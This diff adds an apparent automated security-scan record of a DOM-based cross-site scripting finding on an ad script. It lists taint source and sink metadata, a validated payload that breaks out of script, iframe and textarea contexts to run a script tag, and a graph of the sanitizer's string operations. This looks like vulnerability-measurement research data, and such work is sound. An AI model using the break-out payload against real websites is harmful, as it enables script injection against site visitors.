@@ -1,0 +1,114 @@
+// Finding: 7fe6ef6c-55fa-4855-b6a1-a9e03b76e9fc
+// Finding.url: https://www.example261.com/project-management-tutorial.html
+// Finding.parentloc: https://www.example261.com/project-management-tutorial.html##'></iframe></style></script></object></embed></textarea><script>taintfoxLog('a3ac938654b44df6bf46e6a3b89495ae')</script><!--/*
+// Finding.domain: www.example261.com
+// Finding.base_domain: example261.com
+// Finding.source: location.href
+// Finding.sink: document.write
+// Sanitizer.score: 1
+// Sanitizer.name: SekindoClientDetections_URL/this.setInfo
+// Sanitizer.location: https://live.example5.com/live/liveView.php?s=99260&cbuster=775414824&pubUrl=https://www.example261.com/project-management-tutorial.html%23%23%27%3E%3C/iframe%3E%3C/style%3E%3C/script%3E%3C/object%3E%3C/embed%3E%3C/textarea%3E%3Cscript%3EtaintfoxLog(%27a3ac938654b44df6bf46e6a3b89495ae%27)%3C/script%3E%3C!--/*&subId=[SUBID_ENCODED]&x=728&y=90 - SekindoClientDetections_URL/this.setInfo:621:7
+// Finding.begin: 384
+// Finding.end: 453
+// Finding.original_uuid: 1ca512a4-ea2b-4bc6-869f-ec7f66829ea6
+// Finding.TwentyFiveMillionFlowsId: -816411276
+// Finding.script: https://live.example5.com/live/liveView.php?s=99260&cbuster=775414824&pubUrl=https://www.example261.com/project-management-tutorial.html%23%23%27%3E%3C/iframe%3E%3C/style%3E%3C/script%3E%3C/object%3E%3C/embed%3E%3C/textarea%3E%3Cscript%3EtaintfoxLog(%27a3ac938654b44df6bf46e6a3b89495ae%27)%3C/script%3E%3C!--/*&subId=[SUBID_ENCODED]&x=728&y=90
+// Finding.line: 915
+// Exploit.uuid: a3ac9386-54b4-4df6-bf46-e6a3b89495ae
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: src
+// Exploit.quote_type: '
+// Exploit.tag: script
+// Exploit.break_out: #'></iframe></style></script></object></embed></textarea><script>
+// Exploit.break_in: </script><!--/*
+// Exploit.payload: #'></iframe></style></script></object></embed></textarea><script>taintfoxLog(1)</script><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 55
+// Exploit.replace_begin_url: 55
+// Exploit.replace_end_url: 55
+// Exploit.replace_begin_param: 274
+// Exploit.replace_end_param: 274
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -59434439
+// DepGraph.sanitizer_hash: 763613392
+
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="encodeURIComponent"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=ellipse, label="."];
+n4 [shape=box, label="Lit: &pubUrlAuto="];
+n5 [shape=ellipse, label="."];
+n6 [shape=box, label="Lit: https://live.example5.com/live/liveView.php?s=99260&cbuster=775....3E%3C!--/*&subId=[SUBID_ENCODED]&x=728&y=90&cbuster=1619707311"];
+n7 [shape=ellipse, label="str_replace_once"];
+n8 [shape=box, label="Lit: SEKXLEN"];
+n9 [shape=box, label="Lit: 728"];
+n10 [shape=box, label="Var: x"];
+n11 [shape=ellipse, label="str_replace_once"];
+n12 [shape=box, label="Lit: SEKYLEN"];
+n13 [shape=box, label="Lit: 90"];
+n14 [shape=box, label="Var: x"];
+n15 [shape=ellipse, label="str_replace_once"];
+n16 [shape=box, label="Lit: '"];
+n17 [shape=box, label="Lit: %27"];
+n18 [shape=box, label="Var: x"];
+n19 [shape=ellipse, label="str_replace_once"];
+n20 [shape=box, label="Lit: /liveView.php"];
+n21 [shape=box, label="Lit: /prebid-ads.php"];
+n22 [shape=box, label="Var: x"];
+n23 [shape=ellipse, label="."];
+n24 [shape=box, label="Lit: &csuuid=608ac5afd4bce"];
+n25 [shape=ellipse, label="."];
+n26 [shape=box, label="Lit: &videoType=flow&floatWidth=400&floatHeight=225&floatDirection=....0&floatCloseBtn=1&flowMode=below&flowCloseButtonPosition=right"];
+n27 [shape=box, label="Var: x"];
+n28 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n3 -> n4;
+n3 -> n1;
+n5 -> n6;
+n5 -> n3;
+n10 -> n5;
+n7 -> n8;
+n7 -> n9;
+n7 -> n10;
+n14 -> n7;
+n11 -> n12;
+n11 -> n13;
+n11 -> n14;
+n18 -> n11;
+n15 -> n16;
+n15 -> n17;
+n15 -> n18;
+n22 -> n15;
+n19 -> n20;
+n19 -> n21;
+n19 -> n22;
+n23 -> n19;
+n23 -> n24;
+n25 -> n23;
+n25 -> n26;
+n27 -> n25;
+n28 -> n27;
+}
